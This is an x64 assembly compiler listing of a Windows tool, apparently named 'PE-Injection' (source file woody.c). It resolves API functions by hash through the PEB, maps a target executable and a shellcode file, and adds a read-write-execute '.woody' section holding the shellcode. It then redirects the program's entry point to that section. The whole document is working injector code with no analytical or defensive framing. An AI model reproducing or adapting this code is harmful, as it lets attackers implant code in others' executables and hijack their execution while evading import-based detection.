; Listing generated by Microsoft (R) Optimizing Compiler Version 19.41.34120.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	Run
PUBLIC	inject_shellcode_pe
PUBLIC	inject_shellcode
PUBLIC	read_pe_header
PUBLIC	map_file
PUBLIC	align
PUBLIC	ft_memcpy
PUBLIC	GetProcAddressWithHash
;	COMDAT pdata
pdata	SEGMENT
$pdata$Run DD	imagerel $LN14
	DD	imagerel $LN14+152
	DD	imagerel $unwind$Run
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$inject_shellcode_pe DD imagerel $LN12
	DD	imagerel $LN12+118
	DD	imagerel $unwind$inject_shellcode_pe
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$inject_shellcode DD imagerel $LN36
	DD	imagerel $LN36+304
	DD	imagerel $unwind$inject_shellcode
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$map_file DD imagerel $LN26
	DD	imagerel $LN26+588
	DD	imagerel $unwind$map_file
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$GetProcAddressWithHash DD imagerel $LN37
	DD	imagerel $LN37+263
	DD	imagerel $unwind$GetProcAddressWithHash
pdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$GetProcAddressWithHash DD 091501H
	DD	057415H
	DD	046415H
	DD	035415H
	DD	023415H
	DD	0e015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$map_file DD 0c1f01H
	DD	016741fH
	DD	015641fH
	DD	014341fH
	DD	0f018d21fH
	DD	0d014e016H
	DD	05010c012H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$inject_shellcode DD 091401H
	DD	076414H
	DD	065414H
	DD	053414H
	DD	0e012f014H
	DD	07010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$inject_shellcode_pe DD 010401H
	DD	0e204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$Run DD	020901H
	DD	05002d209H
xdata	ENDS
; Function compile flags: /Ogspy
;	COMDAT GetProcAddressWithHash
_TEXT	SEGMENT
dwModuleFunctionHash$ = 16
GetProcAddressWithHash PROC				; COMDAT
; File C:\Users\Administrator\Desktop\PE-Injection\src\GetProcAddressWithHash.h
; Line 57
$LN37:
	mov	rax, rsp
	mov	QWORD PTR [rax+8], rbx
	mov	QWORD PTR [rax+16], rbp
	mov	QWORD PTR [rax+24], rsi
	mov	QWORD PTR [rax+32], rdi
	push	r14
; Line 77
	mov	rax, QWORD PTR gs:96
	mov	ebp, ecx
; Line 86
	xor	r14d, r14d
	mov	rdx, QWORD PTR [rax+24]
	mov	r9, QWORD PTR [rdx+16]
	jmp	$LN35@GetProcAdd
$LL2@GetProcAdd:
; Line 89
	mov	r8, QWORD PTR [r9+48]
	mov	edx, r14d
; Line 90
	movups	xmm0, XMMWORD PTR [r9+88]
; Line 95
	mov	r9, QWORD PTR [r9]
	movsxd	rax, DWORD PTR [r8+60]
	mov	r10d, DWORD PTR [rax+r8+136]
; Line 98
	test	r10d, r10d
	je	SHORT $LN35@GetProcAdd
; Line 104
	movq	rax, xmm0
	shr	rax, 16
	cmp	r14w, ax
	jae	SHORT $LN5@GetProcAdd
	psrldq	xmm0, 8
	movq	r11, xmm0
	movzx	ebx, ax
$LL6@GetProcAdd:
; Line 110
	movsx	ecx, BYTE PTR [r11]
	ror	edx, 13
	add	ecx, edx
	cmp	BYTE PTR [r11], 97			; 00000061H
	lea	edx, DWORD PTR [rcx-32]
	cmovl	edx, ecx
	inc	r11
	sub	rbx, 1
	jne	SHORT $LL6@GetProcAdd
$LN5@GetProcAdd:
; Line 120
	add	r10, r8
; Line 125
	mov	r11d, r14d
	mov	edi, DWORD PTR [r10+32]
	add	rdi, r8
	cmp	DWORD PTR [r10+24], r14d
	jbe	SHORT $LN35@GetProcAdd
$LL9@GetProcAdd:
; Line 128
	mov	esi, DWORD PTR [rdi]
	mov	ebx, r14d
	add	rsi, r8
; Line 129
	lea	rdi, QWORD PTR [rdi+4]
$LL12@GetProcAdd:
; Line 136
	movsx	ecx, BYTE PTR [rsi]
; Line 137
	inc	rsi
	ror	ebx, 13
	add	ebx, ecx
; Line 138
	test	cl, cl
	jne	SHORT $LL12@GetProcAdd
; Line 140
	lea	eax, DWORD PTR [rbx+rdx]
; Line 142
	cmp	eax, ebp
	je	SHORT $LN23@GetProcAdd
; Line 125
	inc	r11d
	cmp	r11d, DWORD PTR [r10+24]
	jb	SHORT $LL9@GetProcAdd
$LN35@GetProcAdd:
; Line 86
	cmp	QWORD PTR [r9+48], r14
	jne	$LL2@GetProcAdd
; Line 151
	xor	eax, eax
$LN1@GetProcAdd:
; Line 152
	mov	rbx, QWORD PTR [rsp+16]
	mov	rbp, QWORD PTR [rsp+24]
	mov	rsi, QWORD PTR [rsp+32]
	mov	rdi, QWORD PTR [rsp+40]
	pop	r14
	ret	0
$LN23@GetProcAdd:
; Line 144
	mov	eax, DWORD PTR [r10+36]
	lea	ecx, DWORD PTR [r11+r11]
	add	rax, r8
; Line 145
	movzx	edx, WORD PTR [rcx+rax]
	mov	ecx, DWORD PTR [r10+28]
	add	rcx, r8
	mov	eax, DWORD PTR [rcx+rdx*4]
	add	rax, r8
	jmp	SHORT $LN1@GetProcAdd
GetProcAddressWithHash ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT ft_memcpy
_TEXT	SEGMENT
dst$ = 8
src$ = 16
n$ = 24
ft_memcpy PROC						; COMDAT
; File C:\Users\Administrator\Desktop\PE-Injection\src\woody.c
; Line 10
	mov	r9, rcx
; Line 13
	test	rcx, rcx
	jne	SHORT $LN4@ft_memcpy
	test	rdx, rdx
	jne	SHORT $LN4@ft_memcpy
; Line 14
	xor	eax, eax
; Line 22
	ret	0
$LN4@ft_memcpy:
; Line 16
	test	r8, r8
	je	SHORT $LN3@ft_memcpy
; Line 15
	sub	rdx, r9
$LL8@ft_memcpy:
; Line 18
	mov	al, BYTE PTR [rcx+rdx]
	mov	BYTE PTR [rcx], al
; Line 19
	inc	rcx
	sub	r8, 1
	jne	SHORT $LL8@ft_memcpy
$LN3@ft_memcpy:
; Line 21
	mov	rax, r9
; Line 22
	ret	0
ft_memcpy ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT align
_TEXT	SEGMENT
size$ = 8
align$ = 16
addr$ = 24
align	PROC						; COMDAT
; File C:\Users\Administrator\Desktop\PE-Injection\src\woody.c
; Line 25
	mov	r9d, edx
; Line 26
	mov	eax, ecx
	xor	edx, edx
	div	r9d
	test	edx, edx
	jne	SHORT $LN2@align
; Line 27
	lea	eax, DWORD PTR [rcx+r8]
; Line 29
	ret	0
$LN2@align:
; Line 28
	sub	ecx, edx
	lea	eax, DWORD PTR [r9+rcx]
	add	eax, r8d
; Line 29
	ret	0
align	ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT map_file
_TEXT	SEGMENT
uString$ = 64
sKernel32$ = 80
pe_filename$ = 160
injector$ = 168
sc_filename$ = 176
hKernel32$ = 184
map_file PROC						; COMDAT
; File C:\Users\Administrator\Desktop\PE-Injection\src\woody.c
; Line 58
$LN26:
	mov	QWORD PTR [rsp+8], rbx
	mov	QWORD PTR [rsp+16], rsi
	mov	QWORD PTR [rsp+24], rdi
	push	rbp
	push	r12
	push	r13
	push	r14
	push	r15
	mov	rbp, rsp
	sub	rsp, 112				; 00000070H
	mov	r12, rcx
; Line 68
	mov	DWORD PTR sKernel32$[rbp-112], 6619243	; 0065006bH
	xor	esi, esi
	mov	DWORD PTR sKernel32$[rbp-108], 7209074	; 006e0072H
; Line 71
	mov	ecx, -1111516141			; bdbf9c13H
	mov	QWORD PTR hKernel32$[rbp-112], rsi
	mov	r13, r8
	mov	DWORD PTR sKernel32$[rbp-104], 7077989	; 006c0065H
	mov	rbx, rdx
	mov	DWORD PTR sKernel32$[rbp-100], 3276851	; 00320033H
	mov	DWORD PTR sKernel32$[rbp-96], 6553646	; 0064002eH
	mov	DWORD PTR sKernel32$[rbp-92], 7077996	; 006c006cH
	call	GetProcAddressWithHash
	mov	rdi, rax
; Line 74
	test	rax, rax
	je	$LN3@map_file
; Line 72
	mov	ecx, 1591296437				; 5ed941b5H
	call	GetProcAddressWithHash
; Line 74
	test	rax, rax
	je	$LN3@map_file
; Line 82
	lea	rax, QWORD PTR sKernel32$[rbp-112]
; Line 83
	mov	QWORD PTR uString$[rbp-112], 1572888	; 00180018H
; Line 86
	lea	r9, QWORD PTR hKernel32$[rbp-112]
	mov	QWORD PTR uString$[rbp-104], rax
	lea	r8, QWORD PTR uString$[rbp-112]
	xor	edx, edx
	xor	ecx, ecx
	call	rdi
; Line 87
	cmp	QWORD PTR hKernel32$[rbp-112], rsi
	je	$LN3@map_file
; Line 94
	mov	ecx, 1339750106				; 4fdaf6daH
	call	GetProcAddressWithHash
; Line 95
	mov	ecx, 1881019078				; 701e12c6H
	mov	rdi, rax
	call	GetProcAddressWithHash
; Line 96
	mov	ecx, 603573514				; 23f9cd0aH
	mov	rsi, rax
	call	GetProcAddressWithHash
; Line 97
	mov	ecx, 1970990867				; 757aef13H
	mov	r14, rax
	call	GetProcAddressWithHash
	mov	r15, rax
; Line 100
	test	rdi, rdi
	je	$LN3@map_file
	test	rsi, rsi
	je	$LN3@map_file
	test	r14, r14
	je	$LN3@map_file
	test	rax, rax
	je	$LN3@map_file
; Line 98
	mov	ecx, 1384617670				; 528796c6H
	call	GetProcAddressWithHash
; Line 100
	test	rax, rax
	je	$LN3@map_file
; Line 107
	and	QWORD PTR [rsp+48], 0
	xor	r9d, r9d
	mov	DWORD PTR [rsp+40], 128			; 00000080H
	xor	r8d, r8d
	mov	edx, -1073741824			; c0000000H
	mov	DWORD PTR [rsp+32], 3
	mov	rcx, r12
	call	rdi
	mov	QWORD PTR [rbx+8], rax
; Line 108
	cmp	rax, -1
	je	$LN3@map_file
; Line 114
	xor	edx, edx
	mov	rcx, rax
	call	rsi
	mov	DWORD PTR [rbx+32], eax
; Line 115
	cmp	eax, -1					; ffffffffH
	je	$LN3@map_file
; Line 122
	mov	rcx, QWORD PTR [rbx+8]
	xor	r12d, r12d
	mov	QWORD PTR [rsp+40], r12
	xor	r9d, r9d
	xor	edx, edx
	mov	DWORD PTR [rsp+32], eax
	lea	r8d, QWORD PTR [r12+4]
	call	r14
	mov	QWORD PTR [rbx+16], rax
; Line 123
	test	rax, rax
	je	$LN3@map_file
; Line 130
	mov	ecx, DWORD PTR [rbx+32]
	xor	r9d, r9d
	mov	QWORD PTR [rsp+32], rcx
	xor	r8d, r8d
	mov	rcx, rax
	mov	edx, 983071				; 000f001fH
	call	r15
	mov	QWORD PTR [rbx+24], rax
; Line 131
	test	rax, rax
	je	$LN3@map_file
; Line 139
	mov	QWORD PTR [rsp+48], r12
	xor	r9d, r9d
	mov	DWORD PTR [rsp+40], 128			; 00000080H
	xor	r8d, r8d
	mov	edx, -1073741824			; c0000000H
	mov	DWORD PTR [rsp+32], 3
	mov	rcx, r13
	call	rdi
	mov	rdi, rax
; Line 140
	cmp	rax, -1
	je	SHORT $LN3@map_file
; Line 147
	xor	edx, edx
	mov	rcx, rax
	call	rsi
	mov	DWORD PTR [rbx+72], eax
; Line 148
	cmp	eax, -1					; ffffffffH
	je	SHORT $LN3@map_file
; Line 156
	mov	QWORD PTR [rsp+40], r12
	lea	r8d, QWORD PTR [r12+4]
	xor	r9d, r9d
	mov	DWORD PTR [rsp+32], eax
	xor	edx, edx
	mov	rcx, rdi
	call	r14
; Line 157
	test	rax, rax
	je	SHORT $LN3@map_file
; Line 163
	mov	ecx, DWORD PTR [rbx+72]
	xor	r9d, r9d
	mov	QWORD PTR [rsp+32], rcx
	xor	r8d, r8d
	mov	rcx, rax
	mov	edx, 983071				; 000f001fH
	call	r15
	mov	QWORD PTR [rbx+64], rax
; Line 164
	test	rax, rax
	je	SHORT $LN3@map_file
; Line 176
	mov	al, 1
	jmp	SHORT $LN1@map_file
$LN3@map_file:
; Line 77
	xor	al, al
$LN1@map_file:
; Line 177
	lea	r11, QWORD PTR [rsp+112]
	mov	rbx, QWORD PTR [r11+48]
	mov	rsi, QWORD PTR [r11+56]
	mov	rdi, QWORD PTR [r11+64]
	mov	rsp, r11
	pop	r15
	pop	r14
	pop	r13
	pop	r12
	pop	rbp
	ret	0
map_file ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT read_pe_header
_TEXT	SEGMENT
injector$ = 8
read_pe_header PROC					; COMDAT
; File C:\Users\Administrator\Desktop\PE-Injection\src\woody.c
; Line 182
	mov	rax, QWORD PTR [rcx+24]
	mov	r8, rcx
; Line 183
	mov	ecx, 23117				; 00005a4dH
	cmp	WORD PTR [rax], cx
	jne	SHORT $LN7@read_pe_he
; Line 189
	movsxd	rdx, DWORD PTR [rax+60]
	add	rdx, rax
	mov	QWORD PTR [r8+40], rdx
; Line 190
	cmp	DWORD PTR [rdx], 17744			; 00004550H
	jne	SHORT $LN7@read_pe_he
; Line 196
	mov	eax, 34404				; 00008664H
	cmp	WORD PTR [rdx+4], ax
	jne	SHORT $LN7@read_pe_he
; Line 202
	test	BYTE PTR [rdx+22], 2
	je	SHORT $LN7@read_pe_he
; Line 208
	movzx	eax, WORD PTR [rdx+6]
; Line 209
	movzx	ecx, WORD PTR [rdx+20]
	add	rcx, 24
	mov	WORD PTR [r8+56], ax
	add	rcx, rdx
; Line 211
	mov	al, 1
	mov	QWORD PTR [r8+48], rcx
; Line 212
	ret	0
$LN7@read_pe_he:
; Line 205
	xor	al, al
; Line 212
	ret	0
read_pe_header ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT inject_shellcode
_TEXT	SEGMENT
injector$ = 32
inject_shellcode PROC					; COMDAT
; File C:\Users\Administrator\Desktop\PE-Injection\src\woody.c
; Line 215
$LN36:
	mov	rax, rsp
	mov	QWORD PTR [rax+16], rbx
	mov	QWORD PTR [rax+24], rbp
	mov	QWORD PTR [rax+32], rsi
	push	rdi
	push	r14
	push	r15
; Line 235
	movzx	edx, WORD PTR [rcx+56]
	mov	rbx, rcx
	mov	r11, QWORD PTR [rcx+48]
; Line 239
	mov	rbp, QWORD PTR [rcx+40]
	mov	DWORD PTR [rax+8], 1869575982		; 6f6f772eH
	lea	rsi, QWORD PTR [rdx+rdx*4]
	mov	DWORD PTR [rax+12], 31076		; 00007964H
	mov	rax, QWORD PTR [rax+8]
	lea	rdi, QWORD PTR [rdx+rdx*4]
	mov	QWORD PTR [r11+rdi*8], rax
; Line 26
	xor	edx, edx
; Line 242
	mov	r8d, DWORD PTR [r11+rsi*8-32]
; Line 26
	mov	eax, r8d
; Line 240
	mov	ecx, DWORD PTR [rbp+56]
	mov	r9d, DWORD PTR [rbp+60]
; Line 242
	mov	r10d, DWORD PTR [r11+rsi*8-28]
; Line 26
	div	ecx
	test	edx, edx
	je	SHORT $LN8@inject_she
; Line 28
	mov	eax, ecx
	sub	eax, edx
	add	r8d, eax
$LN8@inject_she:
; Line 242
	lea	r14d, DWORD PTR [r10+r8]
; Line 26
	xor	edx, edx
; Line 247
	mov	r10d, DWORD PTR [rbx+72]
; Line 26
	mov	eax, r10d
; Line 246
	mov	DWORD PTR [r11+rdi*8+12], r14d
; Line 26
	div	ecx
	test	edx, edx
	jne	SHORT $LN12@inject_she
; Line 27
	mov	ecx, r10d
	jmp	SHORT $LN11@inject_she
$LN12@inject_she:
; Line 28
	sub	ecx, edx
	add	ecx, r10d
$LN11@inject_she:
; Line 26
	xor	edx, edx
; Line 248
	mov	DWORD PTR [r11+rdi*8+8], ecx
; Line 26
	mov	eax, r10d
	div	r9d
	test	edx, edx
	jne	SHORT $LN15@inject_she
; Line 27
	mov	r8d, r10d
	jmp	SHORT $LN14@inject_she
$LN15@inject_she:
; Line 28
	mov	r8d, r9d
	sub	r8d, edx
	add	r8d, r10d
$LN14@inject_she:
; Line 250
	mov	DWORD PTR [r11+rdi*8+16], r8d
; Line 26
	xor	edx, edx
; Line 251
	mov	r15d, DWORD PTR [r11+rsi*8-20]
	mov	esi, DWORD PTR [r11+rsi*8-24]
; Line 26
	mov	eax, esi
	div	r9d
	test	edx, edx
	je	SHORT $LN17@inject_she
; Line 28
	sub	r9d, edx
	add	esi, r9d
$LN17@inject_she:
; Line 260
	mov	rdx, QWORD PTR [rbx+64]
	lea	eax, DWORD PTR [r15+rsi]
	mov	DWORD PTR [r11+rdi*8+20], eax
	mov	esi, 1
	lea	eax, DWORD PTR [rcx+r14]
	mov	DWORD PTR [r11+rdi*8+36], -536870880	; e0000020H
	mov	DWORD PTR [rbp+80], eax
	mov	r9, r10
	add	WORD PTR [rbp+6], si
	mov	ecx, DWORD PTR [r11+rdi*8+20]
	add	rcx, QWORD PTR [rbx+24]
; Line 13
	jne	SHORT $LN23@inject_she
	test	rdx, rdx
	je	SHORT $LN22@inject_she
$LN23@inject_she:
; Line 16
	test	r10d, r10d
	je	SHORT $LN22@inject_she
; Line 15
	sub	rdx, rcx
$LL29@inject_she:
; Line 18
	mov	al, BYTE PTR [rcx+rdx]
	mov	BYTE PTR [rcx], al
; Line 19
	add	rcx, rsi
	sub	r9, rsi
	jne	SHORT $LL29@inject_she
$LN22@inject_she:
; Line 262
	add	DWORD PTR [rbx+32], r8d
; Line 267
	mov	rbx, QWORD PTR [rsp+40]
	mov	rsi, QWORD PTR [rsp+56]
	mov	DWORD PTR [rbp+40], r14d
	mov	rbp, QWORD PTR [rsp+48]
	pop	r15
	pop	r14
	pop	rdi
	ret	0
inject_shellcode ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT inject_shellcode_pe
_TEXT	SEGMENT
injector$ = 32
target$ = 128
sc_filename$ = 136
inject_shellcode_pe PROC				; COMDAT
; File C:\Users\Administrator\Desktop\PE-Injection\src\woody.c
; Line 270
$LN12:
	sub	rsp, 120				; 00000078H
; Line 274
	mov	r8, rdx
	mov	QWORD PTR injector$[rsp], rcx
	lea	rdx, QWORD PTR injector$[rsp]
	call	map_file
	test	al, al
	je	SHORT $LN1@inject_she
; Line 183
	mov	rcx, QWORD PTR injector$[rsp+24]
	mov	eax, 23117				; 00005a4dH
	cmp	WORD PTR [rcx], ax
	jne	SHORT $LN1@inject_she
; Line 189
	movsxd	rax, DWORD PTR [rcx+60]
	add	rcx, rax
	mov	QWORD PTR injector$[rsp+40], rcx
; Line 190
	cmp	DWORD PTR [rcx], 17744			; 00004550H
	jne	SHORT $LN1@inject_she
; Line 196
	mov	eax, 34404				; 00008664H
	cmp	WORD PTR [rcx+4], ax
	jne	SHORT $LN1@inject_she
; Line 202
	test	BYTE PTR [rcx+22], 2
	je	SHORT $LN1@inject_she
; Line 208
	movzx	eax, WORD PTR [rcx+6]
	mov	WORD PTR injector$[rsp+56], ax
; Line 209
	movzx	eax, WORD PTR [rcx+20]
	add	rcx, 24
	add	rcx, rax
	mov	QWORD PTR injector$[rsp+48], rcx
; Line 283
	lea	rcx, QWORD PTR injector$[rsp]
	call	inject_shellcode
$LN1@inject_she:
; Line 286
	add	rsp, 120				; 00000078H
	ret	0
inject_shellcode_pe ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT Run
_TEXT	SEGMENT
injector$2 = 32
test$ = 128
shellcode$ = 136
Run	PROC						; COMDAT
; File C:\Users\Administrator\Desktop\PE-Injection\src\woody.c
; Line 289
$LN14:
	push	rbp
	mov	rbp, rsp
	sub	rsp, 112				; 00000070H
; Line 272
	lea	rax, QWORD PTR test$[rbp-112]
; Line 294
	mov	DWORD PTR test$[rbp-112], 2019896931	; 78652e63H
; Line 274
	lea	r8, QWORD PTR shellcode$[rbp-112]
	mov	QWORD PTR injector$2[rbp-112], rax
	lea	rdx, QWORD PTR injector$2[rbp-112]
; Line 298
	mov	WORD PTR test$[rbp-108], 101		; 00000065H
; Line 274
	lea	rcx, QWORD PTR test$[rbp-112]
; Line 302
	mov	DWORD PTR shellcode$[rbp-112], 1768042100 ; 69622e74H
; Line 306
	mov	WORD PTR shellcode$[rbp-108], 110	; 0000006eH
; Line 274
	call	map_file
	test	al, al
	je	SHORT $LN3@Run
; Line 183
	mov	rcx, QWORD PTR injector$2[rbp-88]
	mov	eax, 23117				; 00005a4dH
	cmp	WORD PTR [rcx], ax
	jne	SHORT $LN3@Run
; Line 189
	movsxd	rax, DWORD PTR [rcx+60]
	add	rcx, rax
	mov	QWORD PTR injector$2[rbp-72], rcx
; Line 190
	cmp	DWORD PTR [rcx], 17744			; 00004550H
	jne	SHORT $LN3@Run
; Line 196
	mov	eax, 34404				; 00008664H
	cmp	WORD PTR [rcx+4], ax
	jne	SHORT $LN3@Run
; Line 202
	test	BYTE PTR [rcx+22], 2
	je	SHORT $LN3@Run
; Line 208
	movzx	eax, WORD PTR [rcx+6]
	mov	WORD PTR injector$2[rbp-56], ax
; Line 209
	movzx	eax, WORD PTR [rcx+20]
	add	rcx, 24
	add	rcx, rax
	mov	QWORD PTR injector$2[rbp-64], rcx
; Line 283
	lea	rcx, QWORD PTR injector$2[rbp-112]
	call	inject_shellcode
$LN3@Run:
; Line 310
	add	rsp, 112				; 00000070H
	pop	rbp
	ret	0
Run	ENDP
_TEXT	ENDS
END
